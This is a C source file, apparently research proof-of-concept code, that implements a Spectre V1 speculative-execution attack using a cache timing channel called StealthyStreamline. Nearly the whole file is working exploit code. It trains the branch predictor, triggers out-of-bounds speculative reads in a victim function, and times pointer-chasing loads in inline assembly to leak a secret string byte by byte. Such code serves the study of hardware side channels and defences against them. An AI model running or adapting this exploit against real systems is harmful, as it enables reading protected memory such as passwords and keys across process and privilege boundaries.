/*

Spectre V1 attack using StealthyStreamline channel

Authors: Wenjie Xiong (wenjiex@vt.edu) 

The code is based on the code in the following paper:
Kocher, Paul, et al. "Spectre attacks: Exploiting speculative execution." arXiv preprint arXiv:1801.01203 (2018).

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_LINE_SIZE 8// 8 * 64bits 
/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint64_t array2[64*10*16];// 64 sets, 8way, 64byte cacheline
uint64_t array3[64*10*16];

char * secret = "The_Magic Words_are_12390+mish_Ossifrage";

uint64_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[ array1[x] * CACHE_LINE_SIZE];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 50 /* assume cache hit if time <= threshold */
int perm[256]; //random permutation

int para_v=4;
int para_v2=7;
int para_d=10;

void create_permutation(int size){
//  create random permutation of probe size in perm[]
//  To avoid prefetcher
	for(int i=0; i < size; i++){
		perm[i]=i;
	}

	for(int i=0; i < size; i++){
		int j = i + (rand()%(size-i));
		if(i!=j){
			int tmp=perm[i];
			perm[i]=perm[j];
			perm[j]=tmp;
		}
	
	}

}

void* create_chain(int stride, int offset){
/*create pointer chasing chain in probe array with stride offset decides where to start
    The first element is always array2[offset]
    Return the last element for measure the time
    */
    
    void* last;
	array3[offset + CACHE_LINE_SIZE*64]= (void*) (& array3[ (perm[0]+1)*stride + offset + CACHE_LINE_SIZE*64]);
	for(int i=0; i < 5; i++){
		array3[(perm[i]+1)*stride + offset + CACHE_LINE_SIZE*64]= (void*) (& array3[(perm[i+1]+1)*stride + offset + CACHE_LINE_SIZE*64]);
	}
	last = &array3[(perm[5]+1)*stride + offset + CACHE_LINE_SIZE*64];
    
	return last;
}


/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int time[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time_tmp;
  uint64_t* LRU_way[64][16];
  uint64_t*chain, *chain_last;
  
  /*initialization*/
  for (i = 0; i < 256; i++)
    results[i] = 0;
  
  /*set LRU way pointers, for easy reference*/
  for (i = 0; i< 64;i++) {//64 sets
      create_permutation(8);
      for( j = 0; j < 4;j++){
        LRU_way[i][j]= &array2[CACHE_LINE_SIZE*(i+(j)*64)];
      }
      for( j = 0; j < 8;j++){
          LRU_way[i][j+4]= &array2[CACHE_LINE_SIZE*(i+(perm[j]+5)*64)];
      }
  }
    
  /* create chain */
  create_permutation(6);
  chain_last=create_chain(CACHE_LINE_SIZE*64, CACHE_LINE_SIZE*63);// always in set 63, so do not pollute other sets
  chain=&array3[CACHE_LINE_SIZE*63 + CACHE_LINE_SIZE*64];

  /*start attacking*/
  for (tries = 1000; tries > 0; tries--) {

    /* create random permutation to prevent prefetcher. Each time a different random number will be used*/
    create_permutation(64);

    /*first access way 0-7 to load the data to L1, Now way 0 is the LRU entry*/
    for (i = 0; i< 64;i++) {//64 sets
        for( j = 0; j < para_v2;j++){
            temp ^= *LRU_way[i][j];
        }
    }

    /* The origianl Spetre v1 code*/
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);
    }

    /* Time reads. Order is mixed up to prevent stride prediction */
    for (i = 0; i< 64;i++) {//64 sets
        mix_i = perm[i];
        for( j = para_v2; j < para_d;j++){
        /*load another line to evict LRU way*/
        asm __volatile__ (
        "movq (%%rcx),  %%rax     \n"
        "lfence              \n"
        "rdtsc               \n"
        : "=a" (time_tmp)
        : "c" (LRU_way[mix_i][j]));
        }
        
        for( j = 0; j < para_v;j++){
         *chain_last=LRU_way[mix_i][j];

         /*load the first 7 of the chain to L1*/
         asm __volatile__ (
           "movq (%%rcx),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "lfence              \n"
           "rdtsc               \n"
           : "=a" (time_tmp)
           : "c" (chain));
             asm __volatile__ (
           "lfence              \n" 
           "rdtsc               \n"
           "movl %%eax, %%esi   \n"
           "movq (%%rcx),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "movq (%%rax),  %%rax     \n"
           "lfence              \n"
           "rdtsc               \n"
           "subl %%esi, %%eax   \n"
           : "=a" (time_tmp)
           : "c" (chain)
           : "%esi", "%edx");
            //time[j*64+mix_i]=time_tmp;
        
          if (time_tmp <= CACHE_HIT_THRESHOLD)
            results[j*64+mix_i]++; /* cache hit - add +1 to score for this value */
        }
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      //printf("%d %d\t", i+64,time[i]);
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }

    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
    
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, j, score[2], len = 39;
  uint8_t value[2];

  srand(12);//Not necessary; to run the program deterministically;
    
  for (i = 0; i < sizeof(array2)/8; i++)
    array2[i] = i; /* write to array2 so in RAM not copy-on-write zero pages */
    array3[i] = i; 
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", & len);
  }

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... \n", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X %d=’%c’ score=%d ", value[0], value[0], ((value[0] > 31 && value[0] < 127)? value[0] :0 ), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X %c score=%d)", ((value[0] > 31 && value[0] < 127)? value[0] :0 ), value[1], score[1]);
    printf("\n");
  }
  return (0);
}
